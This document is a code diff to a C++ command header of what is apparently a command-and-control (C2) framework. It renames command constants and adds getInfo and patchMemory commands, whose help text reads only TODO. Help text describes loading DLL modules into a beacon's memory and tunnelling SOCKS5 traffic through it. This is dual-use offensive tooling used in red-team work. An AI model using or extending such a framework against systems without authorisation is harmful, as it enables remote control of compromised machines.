@@ -6,25 +6,28 @@
 
 #include "ModuleCmd.hpp"
 
-
+// TODO replace by number to avoid string in the binary
 const std::string HelpCmd = "help";
 const std::string SleepCmd = "sleep";
 const std::string EndCmd = "end";
 const std::string ListenerCmd = "listener";
-const std::string ListenerPolCmd = "listenerPol";
-const std::string LoadC2Module = "loadModule";
-const std::string UnloadC2Module = "unloadModule";
-const std::string Socks5 = "socks";
-
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
-const std::string ModulesDirectoryFromTeamServer = "../Modules/";
-#endif
+const std::string ListenerPollCmd = "listenerPoll";
+const std::string LoadC2ModuleCmd = "loadModule";
+const std::string UnloadC2ModuleCmd = "unloadModule";
+const std::string Socks5Cmd = "socks";
+const std::string GetInfoCmd = "getInfo";
+const std::string PatchMemoryCmd = "patchMemory";
 
 const std::string StartCmd = "start";
 const std::string StopCmd = "stop";
 
 const std::string CmdStatusSuccess = "Success";
 const std::string CmdStatusFail = "Fail";
+
+
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
+const std::string ModulesDirectoryFromTeamServer = "../Modules/";
+#endif
 
 
 class CommonCommands
@@ -35,9 +38,11 @@ class CommonCommands
 		m_commonCommands.push_back(SleepCmd);
 		m_commonCommands.push_back(EndCmd);
 		m_commonCommands.push_back(ListenerCmd);
-		m_commonCommands.push_back(LoadC2Module);
-		m_commonCommands.push_back(UnloadC2Module);
-		m_commonCommands.push_back(Socks5);
+		m_commonCommands.push_back(LoadC2ModuleCmd);
+		m_commonCommands.push_back(UnloadC2ModuleCmd);
+		m_commonCommands.push_back(Socks5Cmd);
+		m_commonCommands.push_back(GetInfoCmd);
+		m_commonCommands.push_back(PatchMemoryCmd);
 	}
 
 	int getNumberOfCommand()
@@ -81,7 +86,7 @@ class CommonCommands
 			output += " - listener start smb pipename\n";
 			output += " - listener stop uAgXVQny0o1GVoIHf0Jaed4xl5lYpHKU\n";
 		}
-		else if(cmd==LoadC2Module)
+		else if(cmd==LoadC2ModuleCmd)
 		{
 			output = "loadModule: \n";
 			output += "Load module DLL file on the memory of the beacon, giving the beacon this capability.\n";
@@ -89,14 +94,14 @@ class CommonCommands
 			output += "exemple:\n";
 			output += " - loadModule /tools/PrintWorkingDirectory.dll \n";
 		}
-		else if(cmd==UnloadC2Module)
+		else if(cmd==UnloadC2ModuleCmd)
 		{
 			output = "unloadModule: \n";
 			output += "Unload module DLL loaded by loadModule.\n";
 			output += "exemple:\n";
 			output += " - unloadModule assemblyExec \n";
 		}
-		else if(cmd==Socks5)
+		else if(cmd==Socks5Cmd)
 		{
 			output = "socks: \n";
 			output += "Start a socks5 server on the TeamServer and tunnel the traffic to the Beacon.\n";
@@ -105,6 +110,16 @@ class CommonCommands
 			output += "exemple:\n";
 			output += " - socks start 1080 \n";
 			output += " - socks stop \n";
+		}
+		else if(cmd==GetInfoCmd)
+		{
+			output = "getInfo: \n";
+			output += "TODO\n";
+		}
+		else if(cmd==PatchMemoryCmd)
+		{
+			output = "patchMemory: \n";
+			output += "TODO\n";
 		}
 #endif
 		return output;
@@ -117,6 +132,9 @@ class CommonCommands
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 		std::string instruction = splitedCmd[0];
 
+		//
+		// Sleep
+		//
 		if(instruction==SleepCmd)
 		{
 			if(splitedCmd.size()==2)
@@ -141,11 +159,17 @@ class CommonCommands
 				return -1;
 			}
 		}
+		//
+		// End
+		//
 		else if(instruction==EndCmd)
 		{
 			c2Message.set_instruction(instruction);
 			c2Message.set_cmd("");	
 		}
+		//
+		// Listener
+		//
 		else if(instruction==ListenerCmd)
 		{
 			if(splitedCmd.size()>=3)
@@ -220,7 +244,10 @@ class CommonCommands
 				return -1;
 			}
 		}
-		else if(instruction==LoadC2Module)
+		//
+		// Load Memory Module
+		//
+		else if(instruction==LoadC2ModuleCmd)
 		{
 			if (splitedCmd.size() == 2)
 			{
@@ -256,7 +283,7 @@ class CommonCommands
 				return -1;
 			}
 		}
-		else if(instruction==UnloadC2Module)
+		else if(instruction==UnloadC2ModuleCmd)
 		{
 			if (splitedCmd.size() == 2)
 			{
@@ -272,7 +299,10 @@ class CommonCommands
 				return -1;
 			}
 		}
-		else if(instruction==Socks5)
+		//
+		// Socks5
+		//
+		else if(instruction==Socks5Cmd)
 		{
 			if(splitedCmd.size()>=2)
 			{
